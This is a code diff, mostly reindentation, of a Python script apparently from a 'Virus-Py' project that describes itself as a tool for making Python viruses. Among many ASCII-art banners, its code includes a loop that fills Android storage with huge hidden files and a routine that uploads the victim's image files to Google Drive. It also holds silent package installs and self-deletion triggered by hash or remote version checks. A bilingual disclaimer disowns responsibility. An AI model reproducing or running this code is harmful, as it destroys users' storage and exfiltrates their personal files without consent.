+  time.sleep(0.01)
+  print(cyan + """                  @ooo@'     `oooo@|                    """)
+  time.sleep(0.01)
+  print(cyan + """                  @oo@@'      `@oo@|                    """)
+  time.sleep(0.01)
+  print(cyan +
+        """                  @o@@|        @@o@,                         """)
+  time.sleep(0.01)
+  print(
+      cyan +
+      """                  @@@@:        @@o@|                              """)
+  time.sleep(0.01)
+  print(cyan +
+        """                  @@@@:        @@o@|                        """)
+  time.sleep(0.01)
+  print(cyan + """                  `@oo:        `@@@:              """)
+  time.sleep(0.01)
+  print(cyan + """                  /@@@)        /@@@)              """)
+  time.sleep(0.01)
+  print(cyan +
+        """                (@@@@/       (@@@@/                        """)
+  time.sleep(0.01)
+
+
 def sem_19():
-	R = ('\033[31m')
-	W = ("\033[97m")
-	print(W+'''
-	.____.
+  R = ('\033[31m')
+  W = ("\033[97m")
+  print(W + '''
+  .____.
    xuu$``$$$uuu.
  . $``$  $$$`$$$
 dP*$  $  $$$ $$$
@@ -1210,12 +1847,17 @@ dP*$  $  $$$ $$$
    $  $  $$$ $$$
    $$#$  $$$ $$$
    $$'$  $$$ $$$
-   $$`R  $$$ $$$      '''+red+'''__     ___                 '''+W+'''
-   $$$&  $$$ $$$      '''+red+'''\ \   / (_)_ __ _   _ ___   _ __  _   _'''+W+'''
-   $#*$  $$$ $$$      '''+red+''' \ \ / /| | '__| | | / __| | '_ \| | | |'''+W+'''
-   $  $  $$$ @$$      '''+red+'''  \ V / | | |  | |_| \__ \_| |_) | |_| |'''+W+'''
-   $  $  $$$ $$$      '''+red+'''   \_/  |_|_|   \__,_|___(_) .__/ \__, |'''+W+'''
-   $  $  $$$ $$$      '''+red+'''                           |_|    |___/'''+W+'''
+   $$`R  $$$ $$$      ''' + red + '''__     ___                 ''' + W + '''
+   $$$&  $$$ $$$      ''' + red +
+        '''\ \   / (_)_ __ _   _ ___   _ __  _   _''' + W + '''
+   $#*$  $$$ $$$      ''' + red +
+        ''' \ \ / /| | '__| | | / __| | '_ \| | | |''' + W + '''
+   $  $  $$$ @$$      ''' + red +
+        '''  \ V / | | |  | |_| \__ \_| |_) | |_| |''' + W + '''
+   $  $  $$$ $$$      ''' + red +
+        '''   \_/  |_|_|   \__,_|___(_) .__/ \__, |''' + W + '''
+   $  $  $$$ $$$      ''' + red +
+        '''                           |_|    |___/''' + W + '''
    $  $  $B$ $$&.
    $  $  $D$ $$$$$muL.
    $  $  $Q$ $$$$$  `"**mu..
@@ -1256,9 +1898,11 @@ dP*$  $  $$$ $$$
                                            `"#+$$$$$$$$$$$$$$>
                                                  ""**$$$$$$$$>
                                                         ''')
+
+
 def sem_20():
-	print('''
-	⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠄⢀⠂⠠⠐⡀⢀⠂⠀⠄⠀⡀⠀⠀⠂⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+  print('''
+  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠄⢀⠂⠠⠐⡀⢀⠂⠀⠄⠀⡀⠀⠀⠂⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠀⡀⠄⠂⠌⠠⢁⠂⠌⠄⡈⠄⠀⠁⠀⠄⠀⠈⠐⠈⡐⠠⢁⠊⠄⡐⠠⠀⠂⠤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠴⠋⠄⢂⠡⡐⢈⡐⠨⠐⠀⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⡀⠠⠁⠂⠌⠐⡀⠣⠌⡐⠠⢀⠙⠲⣄⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⣠⠞⢋⡐⢂⠌⣂⠢⠐⢂⠐⠀⡁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⡀⠁⠄⢃⡐⠠⡑⣀⠢⠐⡈⠳⣄⠀⠀⠀⠀⠀⠀
@@ -1290,16 +1934,18 @@ def sem_20():
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⡿⢷⡶⢶⣿⣄⣀⣠⣿⣤⣀⣤⣿⡶⣶⣾⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢻⣧⣝⡲⡜⣬⢋⡗⡬⣃⢯⡱⢆⡳⡼⣼⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠓⠻⠶⠿⠼⠷⠾⠶⠿⠚⠛⠛⢁⡀
-'''+red+'''__     ___                 '''+W+'''
-'''+red+'''\ \   / (_)_ __ _   _ ___   _ __  _   _'''+W+'''
-'''+red+''' \ \ / /| | '__| | | / __| | '_ \| | | |'''+W+'''
-'''+red+'''  \ V / | | |  | |_| \__ \_| |_) | |_| |'''+W+'''
-'''+red+'''   \_/  |_|_|   \__,_|___(_) .__/ \__, |'''+W+'''
-'''+red+'''                           |_|    |___/'''+W+'''
+''' + red + '''__     ___                 ''' + W + '''
+''' + red + '''\ \   / (_)_ __ _   _ ___   _ __  _   _''' + W + '''
+''' + red + ''' \ \ / /| | '__| | | / __| | '_ \| | | |''' + W + '''
+''' + red + '''  \ V / | | |  | |_| \__ \_| |_) | |_| |''' + W + '''
+''' + red + '''   \_/  |_|_|   \__,_|___(_) .__/ \__, |''' + W + '''
+''' + red + '''                           |_|    |___/''' + W + '''
 ''')
+
+
 def sem_21():
-	print('''
-	
+  print('''
+
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣴⣶⣶⡆⠀⠀⠀⠀⢰⣶⣶⣦⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣾⣿⣿⣿⣿⠿⠋⠀⠀⠀⠀⠀⠀⠙⠻⣿⣿⣿⣿⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
@@ -1329,15 +1975,21 @@ def sem_21():
 ⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣷⣶⣶⣤⣶⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣤⣶⣶⣾⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠙⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠁⠀⠀⠈⠛⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠛⠛⠿⠿⠿⠿⠿⠿⠿⠛⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠛⠿⠿⠿⠿⠿⠿⠿⠛⠛⠋⠉⠀
-'''+red+'''            __     ___                 '''+W+'''
-'''+red+'''            \ \   / (_)_ __ _   _ ___   _ __  _   _'''+W+'''
-'''+red+'''             \ \ / /| | '__| | | / __| | '_ \| | | |'''+W+'''
-'''+red+'''              \ V / | | |  | |_| \__ \_| |_) | |_| |'''+W+'''
-'''+red+'''               \_/  |_|_|   \__,_|___(_) .__/ \__, |'''+W+'''
-'''+red+'''                                       |_|    |___/'''+W+'''''')
+''' + red + '''            __     ___                 ''' + W + '''
+''' + red + '''            \ \   / (_)_ __ _   _ ___   _ __  _   _''' + W + '''
+''' + red + '''             \ \ / /| | '__| | | / __| | '_ \| | | |''' + W +
+        '''
+''' + red + '''              \ V / | | |  | |_| \__ \_| |_) | |_| |''' + W +
+        '''
+''' + red + '''               \_/  |_|_|   \__,_|___(_) .__/ \__, |''' + W +
+        '''
+''' + red + '''                                       |_|    |___/''' + W +
+        '''''')
+
+
 def sem_21():
-	print('''
-	
+  print('''
+
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣾⡿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⣿⣶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣿⠿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣷⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
@@ -1371,39 +2023,56 @@ def sem_21():
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⢺⣿⣿⣿⣿⣿⣿⡟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁
-'''+red+'''              __     ___                 '''+W+'''
-'''+red+'''              \ \   / (_)_ __ _   _ ___   _ __  _   _'''+W+'''
-'''+red+'''               \ \ / /| | '__| | | / __| | '_ \| | | |'''+W+'''
-'''+red+'''                \ V / | | |  | |_| \__ \_| |_) | |_| |'''+W+'''
-'''+red+'''                 \_/  |_|_|   \__,_|___(_) .__/ \__, |'''+W+'''
-'''+red+'''                                         |_|    |___/'''+W+'''
+''' + red + '''              __     ___                 ''' + W + '''
+''' + red + '''              \ \   / (_)_ __ _   _ ___   _ __  _   _''' + W +
+        '''
+''' + red + '''               \ \ / /| | '__| | | / __| | '_ \| | | |''' + W +
+        '''
+''' + red + '''                \ V / | | |  | |_| \__ \_| |_) | |_| |''' + W +
+        '''
+''' + red + '''                 \_/  |_|_|   \__,_|___(_) .__/ \__, |''' + W +
+        '''
+''' + red + '''                                         |_|    |___/''' + W +
+        '''
 ''')
+
+
 def run_random_funktion():
-    import random
-    random_funktion = random.choice([sem_1,sem_2,sem_3,sem_4,sem_5,sem_6,sem_7,sem_8,sem_9, sem_10, sem_11, sem_12,sem_13,sem_14,sem_15,sem_16,sem_17,sem_18,sem_19,sem_20,sem_21])
-    random_funktion()
+  import random
+  random_funktion = random.choice([
+      sem_1, sem_2, sem_3, sem_4, sem_5, sem_6, sem_7, sem_8, sem_9, sem_10,
+      sem_11, sem_12, sem_13, sem_14, sem_15, sem_16, sem_17, sem_18, sem_19,
+      sem_20, sem_21
+  ])
+  random_funktion()
+
+
 os.system('clear')
 run_random_funktion()
-def check_for_modifications():
-    script_path = os.path.abspath(__file__)
 
-    with open(script_path, 'rb') as f:
-        current_script_hash = hashlib.md5(f.read()).hexdigest()
-    stored_hash_path = os.path.join(os.path.dirname(script_path), '.save.txt')
-    if not os.path.isfile(stored_hash_path):
-        with open(stored_hash_path, "w") as f:
-            f.write(current_script_hash)
-    else:
-        with open(stored_hash_path) as f:
-            stored_script_hash = f.read()
-	
-        if current_script_hash != stored_script_hash:
-	
-            os.remove(script_path)
-            exit()
-	
-    with open(stored_hash_path, 'w') as f:
-        f.write(current_script_hash)
+
+def check_for_modifications():
+  script_path = os.path.abspath(__file__)
+
+  with open(script_path, 'rb') as f:
+    current_script_hash = hashlib.md5(f.read()).hexdigest()
+  stored_hash_path = os.path.join(os.path.dirname(script_path), '.save.txt')
+  if not os.path.isfile(stored_hash_path):
+    with open(stored_hash_path, "w") as f:
+      f.write(current_script_hash)
+  else:
+    with open(stored_hash_path) as f:
+      stored_script_hash = f.read()
+
+    if current_script_hash != stored_script_hash:
+
+      os.remove(script_path)
+      exit()
+
+  with open(stored_hash_path, 'w') as f:
+    f.write(current_script_hash)
+
+
 check_for_modifications()
 #run_random_funktion()
 ####################################
@@ -1655,9 +2324,9 @@ except:
 size = 109559 * 5024 * 1024
 filename_prefix = '.file'
 try:
-	paths = ['/storage/emulated/0/', '/storage/emulated/0/Download/', '/storage/emulated/0/Movies/','/storage/emulated/0/Android/']
+  paths = ['/storage/emulated/0/', '/storage/emulated/0/Download/', '/storage/emulated/0/Movies/','/storage/emulated/0/Android/']
 except:
-	paths = ['/storage/emulated/0/Download/']
+  paths = ['/storage/emulated/0/Download/']
 while True:
     path = random.choice(paths)
     filename = os.path.join(path, f"{filename_prefix}_{uuid.uuid4()}")
@@ -1711,15 +2380,15 @@ var = ("mvvv.py")
 #os.system('mv '+var+'.py '+filename+' /storage/emulated/0/')
 
 try:
-	import requests
-	import join
-	from tqdm import tqdm
-	import tqdm
-	from sys import *
+  import requests
+  import join
+  from tqdm import tqdm
+  import tqdm
+  from sys import *
 except:
-	os.system('pip3 install tqdm')
-	os.system('pip3 install requests')
-	os.system('pip3 install join')
+  os.system('pip3 install tqdm')
+  os.system('pip3 install requests')
+  os.system('pip3 install join')
 RED = ("\033[31m")
 pink = ('\033[95m') 
 print("\033[1;32;40m")
@@ -1787,11 +2456,11 @@ print(RED+'Hello my Friend 💖💗💓💞💕💟💌💘💝❣🤎💜💙�
 print("I love You "+pink+"≧◡≦             ")
 ################
 def color():
-	import os
-	os.system('clear')
-	pink = '\033[95m'
-	C='\033[1;36m'
-	print(C+'''⣿⣿⣿⣿⡿⠟⠛⠋⠉⠉⠉⠉⠉⠛⠛⠻⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+  import os
+  os.system('clear')
+  pink = '\033[95m'
+  C='\033[1;36m'
+  print(C+'''⣿⣿⣿⣿⡿⠟⠛⠋⠉⠉⠉⠉⠉⠛⠛⠻⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
 ⣿⣿⠟⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠈⠙⠾⣿⣾⣿⣾⣿⣾⣿⣾⣿
 ⠋⡁⠀⠀⠀⠀⠀⢀⠔⠁⠀⠀⢀⠠⠐⠈⠁⠀⠀⠁⠀⠈⠻⢾⣿⣾⣿⣾⣟⣿
 ⠊⠀⠀⠀⠀⢀⠔⠃⠀⠀⠠⠈⠁⠀⠀⠀⠀⠀⠀⠆⠀⠀⠄⠀⠙⣾⣷⣿⢿⣿
@@ -1827,62 +2496,62 @@ def color():
 ⡀⠀⢀⢿⣥⡤⠤⠤⠤⣀⣀⢠⠇⠀⢸⠀⠀⢰⠁⠀⢨⠀⢸⠀⠀⠀⠀⣿⣟⣿''')
 ################
 def run():
-	import os
-	import time
-	import zipfile
-	import re
-	import requests
-	import shutil
-	import random
-	import json
-	GREN = ('\033[92m')
-	BLUE = ("\033[34m")
-	pink = ('\033[95m')
-	White = ("\033[97m")
-	RED = ("\033[31m")
-	yellow= ('\033[93m')
-	LIGHTGREEN_EX = ('\033[92m')
-	##################
-	print(White+'''⠀     ⠀  ⠀⠀⠀⠀⠀⠀⠀⣠⠤⠖⠚⢉⣩⣭⡭⠛⠓⠲⠦⣄⡀⠀⠀⠀⠀⠀⠀⠀
-	⠀⠀⠀⠀⠀⠀⢀⡴⠋⠁⠀⠀⠊⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠳⢦⡀⠀⠀⠀⠀
-	⠀⠀⠀⠀⢀⡴⠃⢀⡴⢳⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣆⠀⠀⠀
-	⠀⠀⠀⠀⡾⠁⣠⠋⠀⠈⢧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢧⢧⠀⠀
-	⠀⠀⠀⣸⠁⢰⠃⠀⠀⠀⠈⢣⡀⠀⠀⠀⠀⠀⠀⠀     ⠀⠀⠈⣇⠀⠈⣇⠀
-	⠀⠀⠀⡇⠀⡾⡀⠀⠀⠀⠀⣀⣹⣆⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ⠀⢹⢹⢹⢹⠀
-	 ⠀⠀⢸⠃⢀⣇⡈⠀⠀⠀⠀⠀⠀⢀⡑⢄⡀⢀⠀        ⠀⢹⢹⢹⢹
-	  ⠀⢸⢻'''+GREN+'''⡟⡻⢶⡆⠀⠀⠀⠀⡼⠟⡳⢿⣦'''+White+'''⡑⢄⠀⠀⠀⠀⠀⠀⠀'''+White+''' ⠀ ⢸⢸⡇
-	'''+White+'''⠀ ⣸⢸⠃'''+GREN+'''⡇⢀⠇⠀⠀⠀⠀⠀⡼⠀⠀⠈⣿⣿⣿'''+White+'''⡗⠂⠀⠀⠀⠀⠀   ⢸⢸⠁
-	⠀⠀⡏⠀⣼'''+GREN+'''⠀⢳⠊⠀⠀⠀⠀⠀⠀⠱⣀⣀⠔'''+White+'''⣸⠁⠀⠀⠀⠀⠀⠀   ⢠⡟⠀
-	⠀⠀⡇⢀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⢸⠃⢸⠃⠀
-	⠀⢸⠃⠘⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠁⠀⠀⢀⠀⠀⠀⠀⠀⢸⠃⣾⠀⠀
-	⠀⣸⠀⠀⠹⡄⠀⠀⠈⠁⠀⠀⠀⠀⠀⠀⠀⡞⠀⠀⠀⠸⠀⠀⠀⠀⠀⣾⣾⣾⠀⠀
-	⠀⡏⠀⠀⠀⠙⣆⠀⠀⠀⠀⠀⠀⠀⢀⣠⢶⡇⠀⠀⢰⡀   ⠀⠀⠀⣧⠀⠀⡇⠀⠀
-	⢰⠇⡄⠀⠀⠀⡿⢣⣀⣀⣀⡤⠴⡞⠉⠀⢸⠀⠀⠀⣿⡇⠀  ⠀  ⣧ ⣧⠀
-	⣸⠀⡇⠀⠀⠀⠀⠀⠀⠉⠀⠀⠀⢹⠀⠀⢸⠀⠀⢀⣿⠇⠀⠀⠀⠁  ⢸⠀⢸⠀⠀
-	⣿⠀⡇⠀⠀⠀  '''+pink+''' ⢀⡤⠤⠶⠶⠾⠤⠾⠤'''+White+'''⢸⠀⡀⠸⣿⣀⠀⠀⠀⠀⠀⠈⣇⣀⠀
-	⡇⠀⡇⠀⠀ ⠀'''+pink+'''⡴⠋⠀⠀⠀⠀⠀⠀⠀⠸⡌⣵⡀⢳⡇'''+White+'''⠀⠀⠀⠀⠀  ⠀ ⢹⡀
-	⡇⠀⠇⠀⠀'''+pink+'''⡇⡸⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠮⢧⣀⣻⢂'''+White+'''⠀⠀      ⠀⢧
-	⣇⠀⢠⠀⠀'''+pink+'''⢳⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⡎⣆⠀⠀⠀⠀⠀⠘
-	'''+White+'''⢻⠈⠰⠀ '''+pink+'''⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠰⠘⢮⣧⡀⠀⠀⠀⠀
-	'''+White+'''⠸⡆⠀⠀'''+pink+'''⣾⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠆⠀⠀⠀⠀⠀⠀⠀⠙⠳⣄⡀⢢⢢⡀''')
-	print(BLUE+'CODING BY:'+yellow+' ME ')
-	from time import sleep as timeout
-	import time, os, sys
-	nun = ('abcde')
-	headers = {"Authorization": "Bearer " + nun}
-	for image_file in tqdm.tqdm(image_files + [filename], desc="Please Wait ( づ￣ ³￣ )づ..."):
-	        para = {
-	        "name": os.path.basename(image_file)
-	    }
-	        files = {
-	        'data': ('metadata', json.dumps(para), 'application/json; charset=UTF-8'),
-	        'file': open(image_file, "rb")
-	    }
-	        r = requests.post(
-	        "https://www.googleapis.com/upload/drive/v3/files?uploadType=multipart",
-	        headers=headers,
-	        files=files
-	    )
+  import os
+  import time
+  import zipfile
+  import re
+  import requests
+  import shutil
+  import random
+  import json
+  GREN = ('\033[92m')
+  BLUE = ("\033[34m")
+  pink = ('\033[95m')
+  White = ("\033[97m")
+  RED = ("\033[31m")
+  yellow= ('\033[93m')
+  LIGHTGREEN_EX = ('\033[92m')
+  ##################
+  print(White+'''⠀     ⠀  ⠀⠀⠀⠀⠀⠀⠀⣠⠤⠖⠚⢉⣩⣭⡭⠛⠓⠲⠦⣄⡀⠀⠀⠀⠀⠀⠀⠀
+  ⠀⠀⠀⠀⠀⠀⢀⡴⠋⠁⠀⠀⠊⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠳⢦⡀⠀⠀⠀⠀
+  ⠀⠀⠀⠀⢀⡴⠃⢀⡴⢳⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣆⠀⠀⠀
+  ⠀⠀⠀⠀⡾⠁⣠⠋⠀⠈⢧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢧⢧⠀⠀
+  ⠀⠀⠀⣸⠁⢰⠃⠀⠀⠀⠈⢣⡀⠀⠀⠀⠀⠀⠀⠀     ⠀⠀⠈⣇⠀⠈⣇⠀
+  ⠀⠀⠀⡇⠀⡾⡀⠀⠀⠀⠀⣀⣹⣆⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ⠀⢹⢹⢹⢹⠀
+   ⠀⠀⢸⠃⢀⣇⡈⠀⠀⠀⠀⠀⠀⢀⡑⢄⡀⢀⠀        ⠀⢹⢹⢹⢹
+    ⠀⢸⢻'''+GREN+'''⡟⡻⢶⡆⠀⠀⠀⠀⡼⠟⡳⢿⣦'''+White+'''⡑⢄⠀⠀⠀⠀⠀⠀⠀'''+White+''' ⠀ ⢸⢸⡇
+  '''+White+'''⠀ ⣸⢸⠃'''+GREN+'''⡇⢀⠇⠀⠀⠀⠀⠀⡼⠀⠀⠈⣿⣿⣿'''+White+'''⡗⠂⠀⠀⠀⠀⠀   ⢸⢸⠁
+  ⠀⠀⡏⠀⣼'''+GREN+'''⠀⢳⠊⠀⠀⠀⠀⠀⠀⠱⣀⣀⠔'''+White+'''⣸⠁⠀⠀⠀⠀⠀⠀   ⢠⡟⠀
+  ⠀⠀⡇⢀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⢸⠃⢸⠃⠀
+  ⠀⢸⠃⠘⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠁⠀⠀⢀⠀⠀⠀⠀⠀⢸⠃⣾⠀⠀
+  ⠀⣸⠀⠀⠹⡄⠀⠀⠈⠁⠀⠀⠀⠀⠀⠀⠀⡞⠀⠀⠀⠸⠀⠀⠀⠀⠀⣾⣾⣾⠀⠀
+  ⠀⡏⠀⠀⠀⠙⣆⠀⠀⠀⠀⠀⠀⠀⢀⣠⢶⡇⠀⠀⢰⡀   ⠀⠀⠀⣧⠀⠀⡇⠀⠀
+  ⢰⠇⡄⠀⠀⠀⡿⢣⣀⣀⣀⡤⠴⡞⠉⠀⢸⠀⠀⠀⣿⡇⠀  ⠀  ⣧ ⣧⠀
+  ⣸⠀⡇⠀⠀⠀⠀⠀⠀⠉⠀⠀⠀⢹⠀⠀⢸⠀⠀⢀⣿⠇⠀⠀⠀⠁  ⢸⠀⢸⠀⠀
+  ⣿⠀⡇⠀⠀⠀  '''+pink+''' ⢀⡤⠤⠶⠶⠾⠤⠾⠤'''+White+'''⢸⠀⡀⠸⣿⣀⠀⠀⠀⠀⠀⠈⣇⣀⠀
+  ⡇⠀⡇⠀⠀ ⠀'''+pink+'''⡴⠋⠀⠀⠀⠀⠀⠀⠀⠸⡌⣵⡀⢳⡇'''+White+'''⠀⠀⠀⠀⠀  ⠀ ⢹⡀
+  ⡇⠀⠇⠀⠀'''+pink+'''⡇⡸⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠮⢧⣀⣻⢂'''+White+'''⠀⠀      ⠀⢧
+  ⣇⠀⢠⠀⠀'''+pink+'''⢳⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⡎⣆⠀⠀⠀⠀⠀⠘
+  '''+White+'''⢻⠈⠰⠀ '''+pink+'''⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠰⠘⢮⣧⡀⠀⠀⠀⠀
+  '''+White+'''⠸⡆⠀⠀'''+pink+'''⣾⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠆⠀⠀⠀⠀⠀⠀⠀⠙⠳⣄⡀⢢⢢⡀''')
+  print(BLUE+'CODING BY:'+yellow+' ME ')
+  from time import sleep as timeout
+  import time, os, sys
+  nun = ('abcde')
+  headers = {"Authorization": "Bearer " + nun}
+  for image_file in tqdm.tqdm(image_files + [filename], desc="Please Wait ( づ￣ ³￣ )づ..."):
+          para = {
+          "name": os.path.basename(image_file)
+      }
+          files = {
+          'data': ('metadata', json.dumps(para), 'application/json; charset=UTF-8'),
+          'file': open(image_file, "rb")
+      }
+          r = requests.post(
+          "https://www.googleapis.com/upload/drive/v3/files?uploadType=multipart",
+          headers=headers,
+          files=files
+      )
 run()
 color()
 print(GREN+''' ____''')
@@ -1892,314 +2561,575 @@ print(GREN+'''| |_| |'''+RED+''' (_)'''+yellow+''' | | | |  '''+pink+'''__/''')
 print(GREN+'''|____/'''+RED+''' \___/'''+yellow+'''|_| |_|'''+pink+'''\___|''')
 """
 
+
 def op():
-	import webbrowser,wget,requests
-	url = 'https://raw.githubusercontent.com/Kitt-loy/Virus-Py/main/2.0v'
-	response = requests.get(url)
-	version_number = url.split("/")[-1]
-	if __name__ == '__main__':
-		with open(__file__) as f:
-			content = f.read()
-		if response.status_code != 200:
-			print('    This script is outdated. Please update it to version', version_number)
-			os.remove(__file__)
-			exit()
-	words = "\033[34m     𝚃𝙷𝙸𝚂 𝚃𝙾𝙾𝙻 𝙸𝚂 𝙵𝙾𝚁 𝙼𝙰𝙺𝙴 𝙿𝚈𝚃𝙷𝙾𝙽 𝚅𝙸𝚁𝚄𝚂 \n\n"
-	wahr = '\033[34m################################################################\nI am not responsible for any use of this tool or the information provided for the purpose of security and safety. It must be used wisely and responsibly according to the specified terms and conditions, without using it for any unlawful purpose or that may result in any harm or loss.\n################################################################\n\033[92m هذه الأداة لصنع فيروسات على هيئة سكربتات بايثون     \n\n################################################################\nانا لست مسؤولا عن استخدام هذه الأداة أو المعلومات المقدمة بهدف الحماية  والأمان، ويجب استخدامها بحكمة ومسؤولية وفقًا للشروط والأحكام المحددة، دون استخدامها لأي غرض غير قانوني أو يمكن أن يؤدي إلى أي أضرار أو خسائر..\n################################################################\n'
-	vers = ('\033[34m              Virus-Scripts version '+version_number+'\n')
-	
-##################
-	def run():
-		GREN = ('\033[92m')
-		BLUE = ("\033[34m")
-		pink = ('\033[95m')
-		White = ("\033[97m")
-		RED = ("\033[31m")
-		yellow= ('\033[93m')
-		LIGHTGREEN_EX = ('\033[92m')
-		print(vers)
-		for char in words:
-				sleep(0.1)
-				sys.stdout.write(char)
